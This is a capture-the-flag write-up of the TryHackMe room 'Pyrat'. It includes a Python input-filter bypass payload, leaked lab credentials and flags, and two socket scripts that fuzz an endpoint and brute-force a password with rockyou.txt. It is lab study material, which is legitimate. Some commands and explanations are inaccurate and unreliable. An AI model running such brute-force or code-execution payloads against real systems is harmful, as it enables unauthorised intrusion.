# 🐍 PYRAT

## Description:

So on TryHackMe, there is a room named "PYRAT". Here is the summary below:

> "Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root."

It is the summary of PYRAT.

## Summary

Pyrat is a Boot-to-Root machine that focuses on unusual service behavior, Python code execution, filesystem enumeration, credential disclosure through Git configuration, SSH access, process enumeration, endpoint discovery, and password fuzzing.

The initial foothold is obtained by interacting directly with the Python-based service running on port 8000 and leveraging its ability to execute Python expressions. Filesystem enumeration leads to an exposed Git repository containing credentials for the `think` user, allowing SSH access and retrieval of the user flag. Further enumeration reveals a root-owned Python application. A custom Python socket-based fuzzing script is then used to discover an interesting endpoint and eventually identify credentials that allow access to the root account.

---

## WRITE UP / WALKTHROUGH

### Run up the Nmap Scan:

The command I used is `nmap -sC -sV -p- [IP]`

### Two noticeable ports showed:

- port 22/tcp - ssh : Name - http-alt
- port 8000/tcp - python based service : Name - SimpleHTTP/0.6 Python/3.11.2

### With the help of netcat (nc) we found:

Some unusual errors were shown that were suggesting it isn't a normal Python HTTP-type service running on `<ip>:8000`

### It was confirmed by doing `print("hello")` that Python execution was working:

With the help of `print("hello")` we confirmed that it is indeed Python, but there was a problem — it wasn't displaying any output other than `print`. So we had to work with `print` to check directories.

### Then we tried to use the `os` module:

```python
import os
os.system(id)
```

But the output did not show as we were looking for.

### Then we tried regular syntax, but the terminal only showed print statements:

After trying to get output other than `print`, but not succeeding, with help of GPT we tried:

```python
print(import("os").listdir("/"))
```

Which surprisingly worked and we could see the Linux directories.

> **Note:** looking back, this worked because the service was likely only blocking `import` as a bare *statement* (checking/filtering the input text), not as an expression used inside another call like `print(...)`. Wrapping it inside `print()` slipped past whatever check was blocking a plain `import os` line.

---

### So after checking other directories it found a normal and regular Linux directory system. While checking `/home` we found 2 users:

`/home` → `think` & `ubuntu`

While checking these two profiles, `think` was restricted, while `ubuntu` was accessible.

### While exploring `ubuntu`, found:

- `.profile` → nothing useful, just a regular file
- `.bashrc` → just ordinary shell configuration
- `.bash_logout` → regular file
- `.ssh` → permission denied

### After this we checked some other directories:

- `/var` → completely normal, nothing suspicious
- `/tmp` → still completely normal files, nothing
- `/opt` → there is a single folder which was unusual, and it was `/dev` because
- `/dev` → it has a file named `.git`

### More about the `.git` directory:

The `.git` directory was useful because the chance of having user access credentials could be beneficial. While checking the `.git` directory, it was surely a real `.git` directory because it contained files like `objects`, `HEAD`, `hooks`, `info`, `logs`, etc.

To read `.git` files we used Python-based file reading since it was Python execution:

```python
print(open("/path/to/file").read())
```

1. We started with the `HEAD` file and found `refs/heads/master`, which wasn't that useful at it seems:

```
0000000000000000000000000000000000000000
0a3c36d66369fd4b07ddca72e5379461a63470bf
Jose Mario josemlwdf@github.com
1687339934 +0000
commit (initial): Added shell endpoint
```

Which I don't think is useful as it seems.

2. After that we read the `config` file, which was very helpful and led us to the next step:

So the CONFIG file contained:

```ini
[core]
repositoryformatversion = 0
filemode = true
bare = false
logallrefupdates = true

[user]
name = Jose Mario
email = josemlwdf@github.com

[credential]
helper = cache --timeout=3600

[credential "https://github.com"]
username = think
password = TH1NKINGPirate$
```

And here we got the user credentials:

- **Username** → `think`
- **Password** → `TH1NKINGPirate$`

> Git repositories can contain sensitive configuration and credential information. Exposed `.git` directories or local Git configuration files may disclose usernames, remote repositories, commit history, or cached credentials.

---

### By connecting to THINK with SSH:

In the Nmap result we found that port 22 was open, which was SSH, so with these credentials we connected via SSH:

```bash
$ ssh think@<ip>
```

By using the password we got access to the `think` user. We transitioned from remote Python execution to an authenticated interactive user shell.

### Capturing the User Flag:

After exploring the `think` user, we found a file named `userflag.txt`. It contained a string which was `996bdb1f619a68361417cabca5454705` (redacted — solve it yourself!).

After putting this string into the answer box, it was confirmed that the user flag was compromised.

---

## Beginning privilege escalation:

We checked whether we had any root access using `sudo -l` and `sudo su`, but `sudo` permission was not working — it was denied.

After that, in privilege escalation, we used `grep` to find something useful to get to the next clue:

```bash
$ cd / | grep python
```

```
root  679  /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root  715  /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root  716  python3 /root/pyrat.py
root  753  python3 /root/pyrat.py
root  769  /usr/bin/python3 /usr/share/unattended-upgrades/...
```

This was important because this result contained `python3 /root/pyrat.py`, meaning the main Pyrat application was running on this machine. The problem was this was running under root, which we did not have any access to.

> - While we also found `0.0.0.0:34225`, which we thought might connect to root — but it did not work.
> - So we tried netcat to connect to this service, but it did not work.
> - We tried curl to send an HTTP request, but that didn't work either.

---

## Creating a FUZZING Python Script:

After getting stuck for a while, I took help from YouTube and found out that we needed a **Python fuzzing script**.

### Script 1: Fuzzing for a valid username/endpoint

We used this Python script to fuzz through a list of words and try to find one we could use:

```python
import socket

host = 'pyrat.thm'
port = 8000

# setting up the wordlist for fuzzing
wordlist_test = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

# setup the request to the endpoint!
def fuzzz(wordlist_test):
    try:
        # opening the file
        with open(wordlist_test, 'r') as file:
            for line in file:
                # removing new line
                cmd = line.strip()
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    # AF_INET is referred to as IPV4 and SOCK_STREAM as TCP
                    s.connect((host, port))
                    s.sendall(cmd.encode() + b"\n")
                    response = s.recv(6769).decode().strip()

                    # logic to catch valid response
                    if response != "" and "is not defined" not in response and "leading zeros" not in response:
                        print(f"response :{response}")
                        print(f"COMMAND IS :{cmd}")
    except FileNotFoundError:
        print("There is NO file")
    except Exception as e:
        print(f"ERROR:{e}")

fuzzz(wordlist_test)
```

**Explanation of Script:**

First we import the library `socket`, then we define the host and its port. After that we define a wordlist which it can use to find a username or endpoint. Then we define a function named `fuzzz` with the wordlist as a parameter, which opens and reads the file, sends each line to the host:port, and receives the response on port 6769. We check whether the result is not empty/undefined, and if so, print it. If we get any error, we use error handling to display the exact error we're facing.

**NOTE:** As I am writing this write-up after the CTF, I don't recall the exact response and command we found from this script. But from fuzzing this endpoint, `admin` came back as the keyword that got a distinctly different response than everything else in the wordlist — that's what led to hardcoding `admin` as the username in Script 2 below to fuzz the password against it.

### Script 2: To find the username's password

The application exposed different responses depending on whether the supplied input was interpreted as a valid command, username, endpoint, or password. I therefore automated the interaction with a socket-based Python script and used the response differences as the success condition.

```python
import socket
import sys

host = 'pyrat.thm'
port = 8000

pas_wordlist = "/usr/share/wordlists/rockyou.txt"

def fuzz_pas(pas_wordlist):
    try:
        with open(pas_wordlist, "r") as file:
            for pas in file:
                cmd = pas.strip()
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    s.sendall(b'admin\n')
                    response = s.recv(6769).decode().strip()

                    if "password" in response.lower():
                        s.sendall((pas + '\n').encode())
                        response = s.recv(6769).decode().strip()

                        if "password:" in response.lower():
                            continue
                        else:
                            print(f"FOUND THE PASSWORD:{pas}")
                            break
                    else:
                        print("NO LUCK ")
    except FileNotFoundError:
        print("There is NO file")
    except Exception as e:
        print(f"ERROR:{e}")

fuzz_pas(pas_wordlist)
```

**Explanation of Script:**

It's the same Python script as the first one, but with minor changes — we changed the wordlist we're using. This time we used `rockyou.txt`, a popular wordlist for fuzzing passwords, and added an if-else block to extract the password. Other than that, all the code was the same.

---

## FINAL ROOT FLAG:

So after obtaining the username and password, we were able to get the root flag which was:

~~`ba5ed03e9e74bb98054438480165e221`~~ *(redacted — solve it yourself!)*

---

## WHAT I LEARNED:

1. Nmap reconnaissance
2. Raw TCP interaction with Netcat
3. Recognizing abnormal protocol behaviour
4. Python-based execution
5. Filesystem enumeration without a traditional shell
6. Linux user enumeration
7. Git internals
8. Credential leakage
9. SSH lateral movement
10. Process enumeration
11. Recognizing root-owned application services
12. Endpoint discovery
13. Fuzzing
14. Basic Python automation
15. Full boot-to-root attack chain thinking

## CONCLUSION:

- This room demonstrated the importance of proper enumeration.
- Small clues such as an exposed `.git` directory and an unusual HTTP response can completely change the attack path.
- Automation through Python scripting can make repetitive tasks like endpoint discovery and password fuzzing much more efficient.
- The challenge reinforced the importance of understanding the logic behind an application instead of relying solely on automated tools.

---

## PERSONAL REFLECTION:

Overall, Pyrat was a challenging but rewarding Boot-to-Root machine. It strengthened my understanding of reconnaissance, enumeration, Git information disclosure, credential reuse, Python-based automation, and privilege escalation. Although I needed to take some guidance and support, I now understand the pattern and attack chain. In the future I can do Boot-to-Root machines with more accuracy, less guidance, and more confidence.

> *Every system tells a story. DEDSEC just knows how to read it.*
